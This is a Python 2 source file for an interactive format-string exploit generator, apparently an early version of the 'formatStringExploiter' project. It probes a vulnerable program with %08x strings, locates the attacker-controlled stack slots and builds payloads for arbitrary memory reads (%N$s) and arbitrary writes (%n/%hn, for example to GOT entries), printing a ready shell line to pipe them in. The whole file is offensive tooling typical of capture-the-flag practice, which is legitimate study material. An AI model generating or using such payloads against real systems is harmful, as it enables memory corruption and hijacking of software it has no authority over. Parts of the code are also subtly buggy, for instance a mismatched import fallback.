#!/usr/bin/env python

from prettytable import PrettyTable
import string
import binascii
import struct
import sys

try:
    import pwnlib
except:
    pwntools = None

binary_pwn = None

def isPrintable(s):
    return min(map(lambda x: x in (string.printable + "\x00").replace("\x0a",""),s))

def nativeToString(s):
    """
    Format string (or really just reverse it) based on native endianess of binary
    Returns "formatted" string
    example: nativeToString("olleh") in a little endian binary will return "hello"
    """
    if binary_pwn:
        s = s[::-1] if binary_pwn.little_endian else s
    else:
        # Assuming little endian if no binary loaded
        s = s[::-1]

    return s

    

def buildTestString(length=10):
    """
    Test string to help define what you control
    """
    # TODO: Add 64-bit support. %016x
    #if length >= 100:
    #    print("Can't do 100 or more length test string. Pattern won't work.")
    #    exit(1)
    
    s = "AAAABBBBCCCCDDDD"
    for x in range(1,length+1):
        s += r"%08x"
    
    print(s)

def parseTestString(s):
    """
    Take output of buildTestString completion
    Determines index and information
    """
    #hexlify("1:%x"[::-1])
    #TODO: Add 64-bit support
    
    def checkForSymbol(addr):
        """
        Check for symbol information on addr.
        Wrapped this so I can add better checks for angr/pwntools
        """
        symbol = None
        if binary_pwn:
            symbol = [sym for sym in binary_pwn.symbols if binary_pwn.symbols[sym] == addr]
            if symbol == []:
                symbol = None
            else:
                symbol = symbol.pop()
        return symbol
    
    def checkForSection(addr):
        """
        Determine what section the symbol is in
        """
        if binary_pwn:
            for sec in binary_pwn.sections:
                if addr in xrange(sec.header.sh_addr,sec.header.sh_addr+sec.header.sh_size):
                    return sec.name
        return ""
    
    def getSectionPerms(section_name):
        """
        Return a dict of permissions for section. Parse section flags.
        """
        if binary_pwn:
            section = binary_pwn.get_section_by_name(section_name)
            section_perms = {}
            flags = section.header.sh_flags
            section_perms['executable'] = True if bool((flags & (2**0)) >> 0) else False
            section_perms['writable'] = True if bool((flags & (2**1)) >> 1) else False
            section_perms['readable'] = True if bool((flags & (2**2)) >> 2) else False
            return section_perms 
    
    # Split out the values
    l = [s[x:x+8] for x in range(0,len(s),8)]
    
    # Sanity check
    if l[0] != "AAAABBBB":
        print("WARNING: First characters != 'AAAABBBB'. There might be an issue")
    if l[1] != "CCCCDDDD":
        print("WARNING: Second characters != 'CCCCDDDD'. There might be an issue")
    l = l[2:]

    args = {}

    for i in xrange(len(l)):
        if l[i] == "41414141":
            control = 1
        elif l[i] == "42424242":
            control = 2
        elif l[i] == "43434343":
            control = 3
        elif l[i] == "44444444":
            control = 4
        else:
            control = None
        
        extra = []
        addr = int(l[i],16)
        
        if isPrintable(binascii.unhexlify(l[i])):
            extra.append(nativeToString(binascii.unhexlify(l[i])))
        
        symbol = checkForSymbol(addr)
        
        # Check if this is a known symbol
        if symbol != None:
            extra.append(symbol)
        
        # TODO: Move this around so I only check this if it's in the got or plt section!
        # Check plt
        #if int(l[i],16) in binary_angr.loader.main_bin.reverse_plt:
        #    extra.append("plt." + binary_angr.loader.main_bin.reverse_plt[int(l[i],16)])
        
        # Check for what section this is in
        section_name = checkForSection(addr)
        
        # We might not always get a name back. Check that we did
        if len(section_name) > 0:
            # TODO: Not sure this is accurate...
            perms = getSectionPerms(section_name)
            section_perms = ""
            section_perms += "R" if perms['readable'] else ""
            section_perms += "W" if perms['writable'] else ""
            section_perms += "X" if perms['executable'] else ""
        else:
            section_name = ""
            section_perms = ""
        
        args[i] = {
            "value": addr,
            "control": control,
            "extra": ', '.join(extra),
            "section_name": section_name,
            "section_perms": section_perms
        }
    
    return args

def printArgs(info):
    """
    Print out known things about this format string
    buildTestString -> parseTestString -> here
    """
    t = PrettyTable(["Arg","Value","Control","Extra","Section","Perms"])
    for i in range(len(args)):
        t.add_row([i,hex(args[i]["value"]),args[i]["control"],args[i]["extra"],args[i]["section_name"],args[i]["section_perms"]])
    
    print("") 
    print(t)

def locateControl(control,args):
    """
    Locate control (1,2,3,4) inside args
    Return which argument this control is in
    Adding 1 in here since that's the correct location
    """
    return [x for x in args if args[x]["control"] == control].pop() + 1

def allControls(args):
    """
    Locate all known controls. Return them in order of args.
    NOTE: Returning control NUMBER here, not arg position, not addr, etc.
    You need to run locateControl() after this with the control number
    to find the actual control location
    """
    return [args[x]["control"] for x in args if args[x]["control"]]

def locateAddr(addr,args):
    """
    Locate addr position in args
    Adding 1 in here since that's the correct location
    """
    assert type(addr) == int
    
    # Enumerate possible locations
    locs = [x for x in args if args[x]["value"] == addr]
    
    # If we found a location, return it
    if len(locs) > 0:
        return locs.pop() + 1
    
    return None

def buildRead(readAddr,args):
    """
    Building block to read something
    str aType == Type of read to do (i.e.: "s","c","08x", etc)
    args = args information from parseTestString
    """
    controls = allControls(args)
    # Prefer the ue of control over non-control points
    if len(controls) > 0:
        control = locateControl(controls[0],args)
    else:
        control = None
    
    assert type(readAddr) == int
    readAddrInt = readAddr
    
    # Endian-ness check. Default to little
    if binary_pwn:
        readAddr = struct.pack("<I" if binary_pwn.little_endian else ">I",readAddr)
    else:
        readAddr = struct.pack("<I",readAddr)
    
    # If we have control, use it
    if control:
        # TODO: Assuming we can use index here. Maybe give option to expand and not use indexing
        s = readAddr + "%{0}$s".format(control)
    
    # If we don't have control, try to find the read on the args
    else:
        addr = locateAddr(readAddrInt,args)
        print(readAddrInt,addr)
        # If we found the addr, use it
        if addr:
            s = "%{0}$s".format(addr)
        
        # If we didn't find it, return None
        else:
            s = None
    
    return s
    

def buildWrite2(writeAddr,writeWhat,args,halfWrite=False,count=0,forceOneShot=False):
    """
    Attempt number two to make this code better...
    Building block to write something somewhere
    int writeAddr == Target address to write (such as got entry)
    int writeWhat == What to write into target address
    args = args information from parseTestString
    count (default 0) = count of chars printed. Allows for multi-part builds (i.e.: write a full pointer)
    halfWrite (deafult False) = Boolean if the write should use half rather than full %n.
    forceOneShot (default False) = Boolean indicating that we should write everything at once.
                                   Auto changes to True if we have no controls.
    """
    
    # Asserts ensure my assumptions are right
    assert type(writeAddr) == int
    assert type(writeWhat) == int
    
    # Get our control list
    controls = allControls(args)
    
    # If we have no controls available, assume we need oneShot
    if len(controls) == 0:
        forceOneShot = True
    
    # Size of writeWhat determines how many control points we need.
    # Forcing one-shot treats larger writes similar to smaller.
    if writeWhat < 0xffff or forceOneShot:
        # If it's small, we only need one addr
        writeAddrList = [writeAddr]
        writeWhatList = [writeWhat]
    
    elif writeWhat < 0xffffffff:
        # If it's larger, we need to do it in halves
        writeAddrList = [writeAddr,writeAddr+2]
        writeWhatList = [writeWhat & 0xffff,writeWhat >> 16]
        # Also, set halfWrite variable
        halfWrite = True
    
    else:
        print("ERROR: Write value larger than 0xffffffff not supported\n")
        return None
    
    ####################################
    # Find viable write addr locations #
    ####################################
    # Now that we've got a list of addrs to write to, we need to find the args to use
    # Preferring args that are already on the stack before control args
    # since control args might be in short supply
    
    # index number for corresponding write addrs
    writeAddrListIndex = []
    for addr in writeAddrList:
        noControl = locateAddr(addr,args)
        
        # If we can find it without needing a control
        if noControl:
            writeAddrListIndex.append({
                "index": noControl,
                "control": None,
                "addr": addr
            })
        # We need to check if we have a control left to use
        elif len(controls) > 0:
            # Use a control
            control = controls.pop(0)
            writeAddrListIndex.append({
                "index": locateControl(control,args),
                "control": control,
                "addr": addr
            })
        else:
            print("ERROR: Unable to find write string")
            return None
    
    ################
    # Write header #
    ################
    # If we're using any of the controls, fill it in here
    controlOne = [packAddr(x['addr']) for x in writeAddrListIndex if x['control'] == 1]
    controlTwo = [packAddr(x['addr']) for x in writeAddrListIndex if x['control'] == 2]
    controlThree = [packAddr(x['addr']) for x in writeAddrListIndex if x['control'] == 3]
    controlFour = [packAddr(x['addr']) for x in writeAddrListIndex if x['control'] == 4]
    
    s = "AAAA" if len(controlOne) == 0 else controlOne[0]
    s += "BBBB" if len(controlTwo) == 0 else controlTwo[0]
    s += "CCCC" if len(controlThree) == 0 else controlThree[0]
    s += "DDDD" if len(controlFour) == 0 else controlFour[0]
    # Update our char count
    count += 16
    
    ###################
    # Add write magic #
    ###################
    
    # Sort our writes to ensure they are in increasing size
    writeWhatList, writeAddrListIndex = (list(t) for t in zip(*sorted(zip(writeWhatList, writeAddrListIndex))))
    
    # Should only be 1 or two of these. But let's try to make this
    # more extensible later
    for what, addrIndex in zip(writeWhatList,writeAddrListIndex):
        # How much do we need to write?
        diff = what - count
        if diff < 0:
            print("ERROR: diff < 0... For now, try a different write number?")
            return None
        # Write it
        s += "%{0}c".format(diff)
        count += diff
        index = addrIndex['index']
        s += "%{0}$n".format(index) if not halfWrite else "%{0}$hn".format(index)
    
    return s

def packAddr(addr):
    """
    Mini function to attempt to pack the addr in the correct endianness.
    Defaults to little if unknown.
    """
    if binary_pwn:
        addr = struct.pack("<I" if binary_pwn.little_endian else ">I",addr)
    else:
        addr = struct.pack("<I",addr)
    
    return addr


def buildWrite(writeAddr,writeWhat,args,count=0,halfWrite=False):
    """
    Building block to write something somewhere
    int writeAddr == Target address to write (such as got entry)
    int writeWhat == What to write into target address
    args = args information from parseTestString
    count (default 0) = count of chars printed. Allows for multi-part builds (i.e.: write a full pointer)
    halfWrite (deafult False) = Boolean if the write should use half rather than full %n.
    """
    # TODO: Some prints don't handle %5$x type format
    # TODO: Maybe add option to not use %20c type format as well
    # TODO: Add type checking for arguments here
   
    if writeWhat > 0xffff:
        print("write > 0xffff isn't supported right now. Call buildWrite multiple times with proper params")
        return None
    
    # count var helps keep track of how much will be printed
    # it also means we can do parts of the write at a time

    # Find our control value 
    controls = allControls(args)
    # Prefer the ue of control over non-control points
    if len(controls) > 0:
        control = locateControl(controls[0],args)
    else:
        control = None
    
    assert type(writeAddr) == int
    assert type(writeWhat) == int
    
    writeAddrInt = writeAddr
    
    # Convert writeAddr to hex
    # Utilize known endianess where possible
    if binary_pwn:
        writeAddr = struct.pack("<I" if binary_pwn.little_endian else ">I",writeAddr)
    else:
        writeAddr = struct.pack("<I",writeAddr)
    
    #######################
    # Known Control Value #
    #######################
    # If we have a control, use it
    if control:
        # Start up the script
        s = writeAddr
        count += len(writeAddr)
        
        # Since there are problems using something like "%6$n" (not sure why)
        # Utilizing arguments to move this manually
        # Saving 1 %c to pad before we write
        s += "%c"*(control-2)
        count += (control - 2)
    
        # Clear the input number if our writeWhat is really small (i.e.:<4)
        #if writeWhat < len(s):
        #    s += "%{0}$n".format(control)
        #    count = 0
        
        # TODO: Need to add h support here as addresses basically won't ever finish
        # Write the amount that we need to 
        diff = writeWhat - count
        
        # If we're already at our count, no need to try to add more characters
        if diff != 0:
            s += "%{0}c".format(diff)
            count += diff
        
        if diff < 0:
            print("Not sure what to do here. We've already written too much... Hint: Try increasing your write value")
            exit(1)
        
        # Time to write it
        s += "%n" if not halfWrite else "%hn"
    
    ####################
    # No Control Value #
    ####################
    else:
        s = ""
        
        # See if we can find it in the args
        addr = locateAddr(writeAddrInt,args)
    
        # If we can't find it, nothing we can do
        if not addr:
            print("ERROR: Couldn't find write address. Hint: Try increasing your test string length\n")
            return None
        
        # If we were able to find it
        # Print out up to 2 away from addr value
        if addr > 2:
            s += "%c"*(addr-2)
            count += (addr-2)
        
        # Adjust the remaining needed count
        assert writeWhat > count
        
        s += "%{0}c".format(writeWhat-count)
        count += writeWhat-count
        
        # Add our write command
        s += "%n" if not halfWrite else "%hn"
    
    return s

def banner():
    print("""
  __                           _         _        _                               _       _ _            
 / _|                         | |       | |      (_)                             | |     (_) |           
| |_ ___  _ __ _ __ ___   __ _| |_   ___| |_ _ __ _ _ __   __ _    _____  ___ __ | | ___  _| |_ ___ _ __ 
|  _/ _ \| '__| '_ ` _ \ / _` | __| / __| __| '__| | '_ \ / _` |  / _ \ \/ / '_ \| |/ _ \| | __/ _ \ '__|
| || (_) | |  | | | | | | (_| | |_  \__ \ |_| |  | | | | | (_| | |  __/>  <| |_) | | (_) | | ||  __/ |   
|_| \___/|_|  |_| |_| |_|\__,_|\__| |___/\__|_|  |_|_| |_|\__, |  \___/_/\_\ .__/|_|\___/|_|\__\___|_|   
                                                           __/ |           | |                           
                                                          |___/            |_|                           
https://github.com/Owlz/formatStringExploiter
""")

def parseNumberOrSymbol(x):
    """
    Take in string as hex or integer. Adjust accordingly.
    Now with support to resolve symbols if we have the ability to.
    """
    # See if we can resolve this as a symbol first
    if binary_pwn:
        # If this is a symbol we know about, resolve it
        if x in binary_pwn.symbols:
            return binary_pwn.symbols[x]

    # Not a symbol we know of, try to resolve int
    try:
        # Try base10 first
        return int(x,10)
    except:
        # Try hex
        return int(x,16)
    # Yes, it will crash out if it is neither

def promptWrite():
    """
    Run through user prompts for arbitrary write.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to overwrite (i.e.: 0x12345678 or 427512645). If you loaded the binary, you can use a symbol as well (i.e.: secret)\n-->\t")
    
    writeAddr = parseNumberOrSymbol(raw_input())
    
    sys.stdout.write("\nEnter value (or symbol name) to write to this address (int or hex)\n-->\t")
    
    writeWhat = parseNumberOrSymbol(raw_input())
     
    s = buildWrite2(writeAddr,writeWhat,args)

    return s

def promptRead():
    """
    Run through user prompts for arbitrary read.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to read (i.e.: 0x12345678 or 427512645). If you loaded the binary, you can use a symbol name here too.\n-->\t")
    
    readAddr = parseNumberOrSymbol(raw_input())
    
    s = buildRead(readAddr,args)
    
    return s

def menuSelect():
    """
    Select action
    """
    
    print("\nWhat to do?")
    print("-----------")
    print("  1) Arbitrary Write")
    print("  2) Arbitrary Read")
    
    return int(raw_input("\nSelect Action: "),10)
    

def loadBin(b):
    """
    Load up the binary to be more helpful
    Will attempt to load binary in pwntools to get more info
    """
    
    # Check for pwnlib importing correctly
    if not pwnlib:
        print("WARNING: Couldn't import pwnlib. (hint: pip install pwntools)")
        return
    
    # Load the binary
    global binary_pwn
    try:
        binary_pwn = pwnlib.elf.ELF(b)
        if binary_pwn.arch == 'amd64':
            print("ERROR: x86-64 not yet supported!")
            exit(1)
    
    except Exception as e:
        print("WARNING: pwntools couldn't load the file.\n\t{0}\n".format(str(e)))

while 1:
    if __name__ == "__main__":
        try:
            banner()

            if len(sys.argv) == 2:
                print("Loading: {0}".format(sys.argv[1]))
                loadBin(sys.argv[1])
    
            length = raw_input("\nTest string length? (default = 10) ")
            if length != "":
                length = int(length)
            else:
                length = 10
    
            sys.stdout.write("\nCopy the following into your format string vulnerable application. The purpose is to automatically determine things about your vulnerability.\n-->\t")
            buildTestString(length)

            sys.stdout.write("\nCopy and paste the output back in here:\n-->\t")
            args = parseTestString(raw_input())

    # Ensure we have known control points    
            numControl = len([x for x in args if args[x]["control"] != None])
    
            printArgs(args)
    
            if numControl > 0:
                print("\nI've discovered {0} known control points.".format(numControl))
    
            else:
                print("\nNo control points discovered... Maybe try a higher length. Capability will be degraded without control points.\n")
    
    # Select action
            action = menuSelect()
    
            if action == 1:
                s = promptWrite()
    
            elif action == 2:
                s = promptRead() 
    
            else:
                print("Invalid input. Exiting.")
                exit(1)

            sys.stdout.write("\nHere's your format string line:\n-->\t")
            print(repr(s))
    
            sys.stdout.write("\nExample from bash:\n-->\t$ echo -e {0} | ./formatString\n\n".format(repr(s)))
            raw_input()
        except:
            null = ""